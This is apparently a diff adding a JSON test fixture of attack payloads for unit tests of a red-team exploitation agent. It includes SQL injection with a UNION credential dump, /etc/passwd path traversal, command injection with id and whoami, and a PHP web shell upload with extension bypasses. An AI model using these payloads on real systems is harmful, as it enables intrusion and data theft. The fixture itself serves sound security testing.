@@ -1,0 +1,120 @@
+# =============================================================================
+# dummy_data/attack_payloads/payloads.json
+# PURPOSE: Sample attack payloads for Red Team agent unit tests.
+#          Covers the most common CWE types in CVE-Bench.
+#          These are DEVELOPMENT TEST FIXTURES only — not real exploit tools.
+# USED BY: tests/unit/test_exploitation_agent.py
+# =============================================================================
+
+{
+  "sql_injection": {
+    "cwe": "CWE-89",
+    "description": "SQL injection payloads for testing",
+    "payloads": [
+      {
+        "name": "basic_error_based",
+        "value": "1'",
+        "expected_response_indicator": "SQL syntax",
+        "technique": "error-based detection"
+      },
+      {
+        "name": "boolean_bypass",
+        "value": "1' OR '1'='1",
+        "expected_response_indicator": "200",
+        "technique": "boolean-based blind"
+      },
+      {
+        "name": "union_2col",
+        "value": "1 UNION SELECT NULL,NULL--",
+        "expected_response_indicator": "200",
+        "technique": "UNION-based extraction"
+      },
+      {
+        "name": "union_extract_users",
+        "value": "1 UNION SELECT username,password FROM users--",
+        "expected_response_indicator": "admin",
+        "technique": "UNION-based credential dump"
+      }
+    ],
+    "target_parameter": "id",
+    "target_endpoint": "/search"
+  },
+
+  "path_traversal": {
+    "cwe": "CWE-22",
+    "description": "Path traversal payloads for testing",
+    "payloads": [
+      {
+        "name": "basic_traversal",
+        "value": "../../../../etc/passwd",
+        "expected_response_indicator": "root:",
+        "technique": "directory traversal"
+      },
+      {
+        "name": "url_encoded",
+        "value": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "expected_response_indicator": "root:",
+        "technique": "URL-encoded traversal"
+      },
+      {
+        "name": "double_encoded",
+        "value": "..%252F..%252Fetc%252Fpasswd",
+        "expected_response_indicator": "root:",
+        "technique": "double URL-encoded traversal"
+      }
+    ],
+    "target_parameter": "file",
+    "target_endpoint": "/download"
+  },
+
+  "command_injection": {
+    "cwe": "CWE-78",
+    "description": "OS command injection payloads for testing",
+    "payloads": [
+      {
+        "name": "semicolon_id",
+        "value": "127.0.0.1; id",
+        "expected_response_indicator": "uid=",
+        "technique": "semicolon command chaining"
+      },
+      {
+        "name": "pipe_whoami",
+        "value": "127.0.0.1 | whoami",
+        "expected_response_indicator": "www-data",
+        "technique": "pipe command chaining"
+      },
+      {
+        "name": "backtick_id",
+        "value": "127.0.0.1`id`",
+        "expected_response_indicator": "uid=",
+        "technique": "backtick subshell"
+      }
+    ],
+    "target_parameter": "host",
+    "target_endpoint": "/ping"
+  },
+
+  "file_upload_rce": {
+    "cwe": "CWE-434",
+    "description": "Malicious file upload payloads for testing",
+    "payloads": [
+      {
+        "name": "php_webshell",
+        "filename": "shell.php",
+        "content": "<?php system($_GET['cmd']); ?>",
+        "content_type": "image/jpeg",
+        "expected_upload_path": "/uploads/shell.php",
+        "technique": "PHP web shell via unrestricted upload"
+      },
+      {
+        "name": "php_webshell_double_ext",
+        "filename": "shell.php.jpg",
+        "content": "<?php system($_GET['cmd']); ?>",
+        "content_type": "image/jpeg",
+        "expected_upload_path": "/uploads/shell.php.jpg",
+        "technique": "double extension bypass"
+      }
+    ],
+    "target_endpoint": "/upload"
+  }
+}
